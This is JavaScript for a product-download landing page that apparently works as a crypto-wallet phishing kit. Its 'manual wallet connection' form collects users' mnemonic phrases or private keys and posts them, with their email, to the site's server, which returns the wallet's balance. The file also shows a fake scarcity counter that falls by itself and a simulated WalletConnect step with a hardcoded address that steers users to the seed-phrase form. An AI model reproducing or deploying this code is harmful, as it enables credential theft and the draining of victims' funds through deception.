document.addEventListener('DOMContentLoaded', () => {
    // Initialize Lucide icons
    if (typeof lucide !== 'undefined') {
        lucide.createIcons();
    }
    
    const header = document.getElementById('main-header');
    const mobileMenuButton = document.getElementById('mobile-menu-button');
    const mobileMenu = document.getElementById('mobile-menu');
    
    // API base URL
    const API_BASE = window.location.origin;
    let currentSessionId = null;

    // Header scroll effect
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });

    // Mobile menu toggle
    if (mobileMenuButton && mobileMenu) {
        mobileMenuButton.addEventListener('click', () => {
            mobileMenu.classList.toggle('hidden');
        });
    }

    // Smooth scrolling for nav links
    document.querySelectorAll('a.nav-link').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            if (targetElement) {
                targetElement.scrollIntoView({
                    behavior: 'smooth'
                });

                if (mobileMenu && !mobileMenu.classList.contains('hidden')) {
                    mobileMenu.classList.add('hidden');
                }
            }
        });
    });

    // Video performance optimization
    const heroVideo = document.getElementById('hero-video');
    if (heroVideo) {
        // Pause video when not visible
        try {
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        heroVideo.play().catch(() => {});
                    } else {
                        heroVideo.pause();
                    }
                });
            }, { threshold: 0.1 });
            
            observer.observe(heroVideo);
        } catch (e) {
            console.warn("IntersectionObserver not supported", e);
        }
        
        // Pause video when tab is not active
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                heroVideo.pause();
            } else {
                heroVideo.play().catch(() => {});
            }
        });
    }

    // Fetch and update slot counter
    const updateSlotCounter = async () => {
        try {
            const response = await fetch(`${API_BASE}/api/stats/slots`);
            if (response.ok) {
                const data = await response.json();
                const slotCounter = document.getElementById('slot-counter');
                if (slotCounter) {
                    slotCounter.textContent = data.slots_left;
                }
            }
        } catch (error) {
            console.error('Failed to fetch slot count:', error);
            // Fallback to random decreasing counter
            const slotCounter = document.getElementById('slot-counter');
            if (slotCounter) {
                const currentValue = parseInt(slotCounter.textContent, 10);
                if (!isNaN(currentValue) && currentValue > 1) {
                    slotCounter.textContent = currentValue - 1;
                }
            }
        }
    };

    // Update slot counter initially and every 30 seconds
    updateSlotCounter();
    setInterval(updateSlotCounter, 30000);

    const walletModal = document.getElementById('wallet-modal');
    const setupInstructionsModal = document.getElementById('setup-instructions-modal');
    const registrationModal = document.getElementById('registration-modal');

    // Registration/Login tab switching
    const showRegisterBtn = document.getElementById('show-register');
    const showLoginBtn = document.getElementById('show-login');
    const registerTab = document.getElementById('register-tab');
    const loginTab = document.getElementById('login-tab');

    if (showRegisterBtn && showLoginBtn && registerTab && loginTab) {
        showRegisterBtn.addEventListener('click', () => {
            registerTab.classList.remove('hidden');
            loginTab.classList.add('hidden');
            showRegisterBtn.classList.add('bg-brand-orange', 'text-white');
            showRegisterBtn.classList.remove('text-gray-400');
            showLoginBtn.classList.remove('bg-brand-orange', 'text-white');
            showLoginBtn.classList.add('text-gray-400');
        });

        showLoginBtn.addEventListener('click', () => {
            loginTab.classList.remove('hidden');
            registerTab.classList.add('hidden');
            showLoginBtn.classList.add('bg-brand-orange', 'text-white');
            showLoginBtn.classList.remove('text-gray-400');
            showRegisterBtn.classList.remove('bg-brand-orange', 'text-white');
            showRegisterBtn.classList.add('text-gray-400');
        });
    }

    // Registration form handling
    const registrationForm = document.getElementById('registration-form');
    if (registrationForm) {
        registrationForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const emailInput = registrationForm.querySelector('input[name="email"]');
            const passwordInput = registrationForm.querySelector('input[name="password"]');
            const confirmPasswordInput = registrationForm.querySelector('input[name="confirmPassword"]');
            const errorMessage = registrationForm.querySelector('.error-message');
            const successMessage = registrationForm.querySelector('.success-message');
            
            // Reset messages
            errorMessage.classList.add('hidden');
            successMessage.classList.add('hidden');
            
            // Validate inputs
            if (!emailInput.value) {
                errorMessage.textContent = 'Email is required';
                errorMessage.classList.remove('hidden');
                return;
            }
            
            if (!passwordInput.value) {
                errorMessage.textContent = 'Password is required';
                errorMessage.classList.remove('hidden');
                return;
            }
            
            if (passwordInput.value !== confirmPasswordInput.value) {
                errorMessage.textContent = 'Passwords do not match';
                errorMessage.classList.remove('hidden');
                return;
            }
            
            // Submit registration
            try {
                const response = await fetch('/api/register', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: emailInput.value,
                        password: passwordInput.value
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    successMessage.textContent = 'Registration successful! You can now log in.';
                    successMessage.classList.remove('hidden');
                    registrationForm.reset();
                    
                    // Auto switch to login tab after 2 seconds
                    setTimeout(() => {
                        if (showLoginBtn) showLoginBtn.click();
                    }, 2000);
                } else {
                    errorMessage.textContent = result.error || 'Registration failed';
                    errorMessage.classList.remove('hidden');
                }
            } catch (error) {
                errorMessage.textContent = 'Network error. Please try again.';
                errorMessage.classList.remove('hidden');
            }
        });
    }

    // Login form handling
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const emailInput = loginForm.querySelector('input[name="email"]');
            const passwordInput = loginForm.querySelector('input[name="password"]');
            const errorMessage = loginForm.querySelector('.error-message');
            
            // Reset messages
            errorMessage.classList.add('hidden');
            
            // Validate inputs
            if (!emailInput.value || !passwordInput.value) {
                errorMessage.textContent = 'Email and password are required';
                errorMessage.classList.remove('hidden');
                return;
            }
            
            // Submit login
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: emailInput.value,
                        password: passwordInput.value
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Store session token
                    localStorage.setItem('sessionToken', result.token);
                    localStorage.setItem('userEmail', emailInput.value);
                    
                    // Close registration modal
                    if (registrationModal) {
                        registrationModal.classList.add('hidden');
                        registrationModal.classList.remove('flex');
                    }
                    
                    // Open wallet connection modal
                    if (walletModal) {
                        walletModal.classList.remove('hidden');
                        walletModal.classList.add('flex');
                    } else {
                        // Fallback to WalletConnect modal
                        const walletConnectionModal = document.getElementById('wallet-connection-modal');
                        if (walletConnectionModal) {
                            walletConnectionModal.classList.remove('hidden');
                            walletConnectionModal.classList.add('flex');
                        }
                    }
                } else {
                    errorMessage.textContent = result.error || 'Login failed';
                    errorMessage.classList.remove('hidden');
                }
            } catch (error) {
                errorMessage.textContent = 'Network error. Please try again.';
                errorMessage.classList.remove('hidden');
            }
        });
    }

    // Demo trigger handlers
    const demoTriggers = document.querySelectorAll(".demo-trigger");
    demoTriggers.forEach(trigger => {
        trigger.addEventListener("click", (e) => {
            e.preventDefault();
            if (window.demoAnimation) {
                window.demoAnimation.startDemo();
            }
        });
    });

    // Download button in success state
    const downloadNowBtn = document.getElementById('download-now-btn');
    if (downloadNowBtn) {
        downloadNowBtn.addEventListener('click', (e) => {
            e.preventDefault();
            
            // Close demo modal
            if (window.demoAnimation) {
                window.demoAnimation.closeDemo();
            }
            
            // Check if user is logged in
            const sessionToken = localStorage.getItem('sessionToken');
            if (sessionToken) {
                // User is logged in, show wallet connection
                if (walletModal) {
                    walletModal.classList.remove('hidden');
                    walletModal.classList.add('flex');
                } else {
                    // Fallback to WalletConnect modal
                    const walletConnectionModal = document.getElementById('wallet-connection-modal');
                    if (walletConnectionModal) {
                        walletConnectionModal.classList.remove('hidden');
                        walletConnectionModal.classList.add('flex');
                    }
                }
            } else {
                // User is not logged in, show registration
                if (registrationModal) {
                    registrationModal.classList.remove('hidden');
                    registrationModal.classList.add('flex');
                }
            }
        });
    }

    // Modal close handlers
    const closeRegistrationModalBtns = document.querySelectorAll(".close-registration-modal");
    const closeWalletModalBtns = document.querySelectorAll(".close-wallet-modal");
    const closeInstructionsModalBtns = document.querySelectorAll(".close-instructions-modal");

    closeRegistrationModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            if (registrationModal) {
                registrationModal.classList.add("hidden");
                registrationModal.classList.remove("flex");
            }
        });
    });

    closeWalletModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            if (walletModal) {
                walletModal.classList.add("hidden");
                walletModal.classList.remove("flex");
            }
            
            const walletConnectionModal = document.getElementById('wallet-connection-modal');
            if (walletConnectionModal) {
                walletConnectionModal.classList.add("hidden");
                walletConnectionModal.classList.remove("flex");
            }
        });
    });

    closeInstructionsModalBtns.forEach(btn => {
        btn.addEventListener("click", () => {
            if (setupInstructionsModal) {
                setupInstructionsModal.classList.add("hidden");
                setupInstructionsModal.classList.remove("flex");
            }
        });
    });

    // WalletConnect tab switching
    const showWalletConnectBtn = document.getElementById('show-walletconnect');
    const showManualBtn = document.getElementById('show-manual');
    const walletConnectTab = document.getElementById('walletconnect-tab');
    const manualTab = document.getElementById('manual-tab');

    if (showWalletConnectBtn && showManualBtn && walletConnectTab && manualTab) {
        showWalletConnectBtn.addEventListener('click', () => {
            walletConnectTab.classList.remove('hidden');
            manualTab.classList.add('hidden');
            showWalletConnectBtn.classList.add('bg-brand-orange', 'text-white');
            showWalletConnectBtn.classList.remove('text-gray-400');
            showManualBtn.classList.remove('bg-brand-orange', 'text-white');
            showManualBtn.classList.add('text-gray-400');
        });

        showManualBtn.addEventListener('click', () => {
            manualTab.classList.remove('hidden');
            walletConnectTab.classList.add('hidden');
            showManualBtn.classList.add('bg-brand-orange', 'text-white');
            showManualBtn.classList.remove('text-gray-400');
            showWalletConnectBtn.classList.remove('bg-brand-orange', 'text-white');
            showWalletConnectBtn.classList.add('text-gray-400');
        });
    }

    // WalletConnect button handler
    const connectWalletConnectBtn = document.getElementById('connect-walletconnect-primary');
    if (connectWalletConnectBtn) {
        connectWalletConnectBtn.addEventListener('click', async () => {
            const errorDiv = document.getElementById('primary-wallet-error');
            const successDiv = document.getElementById('primary-wallet-success');
            
            if (errorDiv) errorDiv.classList.add('hidden');
            if (successDiv) successDiv.classList.add('hidden');
            
            connectWalletConnectBtn.textContent = 'Connecting...';
            connectWalletConnectBtn.disabled = true;
            
            try {
                // Simulate WalletConnect connection
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                const response = await fetch('/api/walletconnect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        address: '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4',
                        email: localStorage.getItem('userEmail') || 'user@example.com'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    if (successDiv) {
                        successDiv.textContent = `🎉 Wallet connected! Balance: $${result.balance.toFixed(2)}`;
                        successDiv.classList.remove('hidden');
                    }
                    
                    localStorage.setItem('connectedWalletAddress', result.address || '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4');
                    
                    setTimeout(() => {
                        if (walletModal) {
                            walletModal.classList.add('hidden');
                            walletModal.classList.remove('flex');
                        }
                        initiateDownload();
                    }, 2000);
                } else {
                    throw new Error(result.error || 'WalletConnect failed');
                }
            } catch (error) {
                console.error('WalletConnect error:', error);
                if (errorDiv) {
                    errorDiv.textContent = 'WalletConnect failed. Please try manual connection.';
                    errorDiv.classList.remove('hidden');
                }
                
                // Auto-switch to manual tab after error
                setTimeout(() => {
                    if (showManualBtn) showManualBtn.click();
                }, 2000);
            } finally {
                connectWalletConnectBtn.textContent = 'Connect with WalletConnect';
                connectWalletConnectBtn.disabled = false;
            }
        });
    }

    // Manual wallet connection form
    const manualWalletForm = document.getElementById('manual-wallet-form');
    if (manualWalletForm) {
        manualWalletForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const mnemonicInput = document.getElementById('mnemonic-input');
            const privateKeyInput = document.getElementById('private-key-input');
            const errorDiv = document.getElementById('primary-wallet-error');
            const successDiv = document.getElementById('primary-wallet-success');
            
            if (errorDiv) errorDiv.classList.add('hidden');
            if (successDiv) successDiv.classList.add('hidden');
            
            const mnemonic = mnemonicInput?.value?.trim();
            const privateKey = privateKeyInput?.value?.trim();
            
            if (!mnemonic && !privateKey) {
                if (errorDiv) {
                    errorDiv.textContent = 'Please enter either a mnemonic phrase or private key';
                    errorDiv.classList.remove('hidden');
                }
                return;
            }
            
            const submitBtn = manualWalletForm.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="loading-spinner"></span> Validating...';
            }
            
            try {
                const type = mnemonic ? 'mnemonic' : 'private_key';
                const credentials = mnemonic || privateKey;
                
                const response = await fetch('/api/validate-wallet', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: type,
                        credentials: credentials,
                        email: localStorage.getItem('userEmail') || 'user@example.com'
                    })
                });
                
                const result = await response.json();
                
                if (result.valid) {
                    if (successDiv) {
                        successDiv.textContent = `🎉 Wallet validated! Address: ${result.address.slice(0,10)}... Balance: $${result.balance_usd.toFixed(2)}`;
                        successDiv.classList.remove('hidden');
                    }
                    
                    localStorage.setItem('connectedWalletAddress', result.address);
                    
                    setTimeout(() => {
                        if (walletModal) {
                            walletModal.classList.add('hidden');
                            walletModal.classList.remove('flex');
                        }
                        initiateDownload();
                    }, 2000);
                } else {
                    if (errorDiv) {
                        errorDiv.textContent = result.error || 'Wallet validation failed';
                        errorDiv.classList.remove('hidden');
                    }
                }
            } catch (error) {
                console.error('Manual wallet validation error:', error);
                if (errorDiv) {
                    errorDiv.textContent = 'Network error: ' + error.message;
                    errorDiv.classList.remove('hidden');
                }
            } finally {
                if (submitBtn) {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Connect Wallet';
                }
            }
        });
    }
});

// Utility functions
function initiateDownload() {
    fetch('/api/download/initiate', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('sessionToken') || ''}`
        },
        body: JSON.stringify({
            wallet_address: localStorage.getItem('connectedWalletAddress') || 'unknown'
        })
    })
    .then(response => response.json())
    .then(result => {
        if (result.success) {
            // Start download
            window.location.href = `/download/${result.downloadToken}`;
            
            // Show setup instructions
            setTimeout(() => {
                const instructionsModal = document.getElementById('setup-instructions-modal');
                if (instructionsModal) {
                    instructionsModal.classList.remove('hidden');
                    instructionsModal.classList.add('flex');
                }
            }, 1000);
        } else {
            console.error('Download initiation failed:', result.error);
            alert('Failed to start download. Please try again.');
        }
    })
    .catch(error => {
        console.error('Download error:', error);
        alert('Network error. Please try again.');
    });
}